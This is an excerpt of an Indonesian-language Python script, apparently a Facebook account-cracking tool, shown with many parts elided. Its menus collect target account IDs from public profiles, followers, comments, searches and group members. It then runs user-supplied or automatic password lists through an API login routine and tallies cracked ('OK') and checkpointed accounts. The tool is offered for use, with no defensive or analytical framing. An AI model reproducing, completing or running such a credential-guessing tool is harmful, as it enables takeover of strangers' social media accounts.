...
class Login:
	...
	def menu_login(self):
		Logo().logonya()
		prints(Panel(f"{B2}\t                            Menu Login",width=87,style=f"{color_panel}"))
		prints(Panel(f"""{P2}[{color_text}01{P2}]. login menggunakan cookie facebook ( {B2}Recomended{P2} )\n[{color_text}02{P2}]. login menggunakan No dan Password ( {M2}No Recomended{P2} )""",width=87,style=f"{color_panel}"))
		login = console.input(f" {H2}• {B2}pilih menu : ")
		if login in["1","01"]:
			prints(Panel(f"""{P2}silahkan masukan cookiemu disini dan pastikan autentikasi tidak aktif""",width=87,style=f"{color_panel}"))
			cookie = console.input(f" {H2}• {B2}masukan cookie : ")
...
class Menu:
	...
	def menu(self):
		...
		self.jol = Console()
		self.tol = Console()
		prints(Panel(f"{K2}        {self.negara}",width=87,padding=(0,30),title=f"{M2}• {B2}• {K2}• {B2}Negara {M2}• {B2}• {K2}•",subtitle=f"{M2}• {B2}• {K2}• {B2}Version : VERSI 2.2{M2} • {B2}• {K2}•",style=f"{color_panel}"))
		yonkou.append(Panel(f" {K2}Nama Akun       {P2}: {B2}{nama}\n {K2}Status Pengguna {P2}: {B2}PRIBADI\n {K2}Ip Address      {P2}: {B2}{self.ip}\n {K2}Tanggal         {P2}: {B2}{tgl}",width=43,padding=(0,2),title=f"{M2}• {B2}• {K2}• {B2}Info {M2}• {B2}• {K2}•",style=f"{color_panel}"))
		yonkou.append(Panel(f" {K2}Recode By {P2}: {B2}Fants\n {K2}Github  {P2} : {B2}github.com\n{K2} Facebook {P2}: {B2} Nothing\n{K2} Whatsapp {P2}: {B2}+62*************",width=43,padding=(0,2),title=f"{M2}• {B2}• {K2}• {B2}Info{M2}• {B2}• {K2}•",style=f"{color_panel}"))
		self.jol.print(Columns(yonkou))
		cetak(Panel(f"{B2}Sunshine ID, Rachel ID, Fall Xavier, Suwan Dundo",width=87,title=f"{B2}Thanks To",style=f"{color_panel}"))
		prints(Panel(f"{B2}\t                           Daftar Menu",width=87,style=f"{color_panel}"))
		pornhub.append(Panel(f"{P2}[{color_text}01{P2}]. crack {K2}dari {B2}id publik\n{P2}[{color_text}02{P2}]. crack {K2}dari {B2}pengikut\n{P2}[{color_text}03{P2}]. crack {K2}dari {B2}komentar\n{P2}[{color_text}04{P2}]. crack {K2}dari {B2}random email",width=43,padding=(0,2),style=f"{color_panel}"))
		pornhub.append(Panel(f"{P2}[{color_text}05{P2}]. crack {K2}dari {B2}pencarian nama\n{P2}[{color_text}06{P2}]. crack {K2}dari {B2}member grup\n{P2}[{color_text}07{P2}]. crack {K2}dari {B2}file sendiri\n{P2}[{color_text}08{P2}]. cek {K2}opsi {B2}checkpoint",width=43,padding=(0,2),style=f"{color_panel}"))
		...
		if menu in["logout"]:
			...
			exit(prints(Panel(f"""{B2}berhasil menghapus cookie, silahkan ketik ulang python Fantss.py""",width=87,style=f"{color_panel}")))
		###----------[ ID PUBLIK ]---------- ###
		elif menu in["1","01"]:
			prints(Panel(f"""{B2}     masukan id target, pastikan id target bersifat publik dan tidak private""",subtitle=f"{P2}ketik {B2}me{P2} untuk dump dari teman sendiri",width=87,style=f"{color_panel}"))
			user = console.input(f" {H2}• {P2}ID / Username: ")
			if user in["Me","me"]:
...
class Crack:
	...
	def atursandi(self):
		prints(Panel(f"""{B2}    berhasil mengumpulkan {len(tampung)} id""",width=87,padding=(0,21),style=f"{color_panel}"))
		set = console.input(f" {B2}• {B2}Tambah Sandi?(y/n) : ")
		
		###----------[ SANDI MANUAL ]---------- ###
		if set in["Y","y"]:
			prints(Panel(f"""{B2}silahkan buat katasandi dengan , (koma) sebagai pemisah tiap katasandi""",width=80,style=f"{color_panel}"))
			...
			app = console.input(f" {H2}• {B2}Tambah Sandi?(y/n) : ")
			if app in["Y","y"]:
		...
		if set in["Y","y"]:
			...
			prints(Panel(f"""{B2}memunculkan aplikasi bisa membuat akun terkena checkpoint/dinonaktifkan""",width=80,style=f"{color_panel}"))
			app = console.input(f" {B2}• {B2}Muncul Apk?(y/n) : ")
			if app in["Y","y"]:
				self.apk.append("muncul")
			else:
				self.apk.append("mobile legends")
			self.otomatis()
	...
	def metode_api(self,email,pwx):
		prog.update(des,description=f" {H2}• {P2}[{B2}Fants{P2}] {P2}[{P2}{str(self.loop)}{P2}/{P2}{len(tampung)}{P2}]{P2} [OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}] [")
		prog.advance(des)
		try:
			for pw in pwx:
				pw = pw.lower()
...
def opsi():
	...
	console.input(f" {H2}⬤ {H2}Tekan Enter")
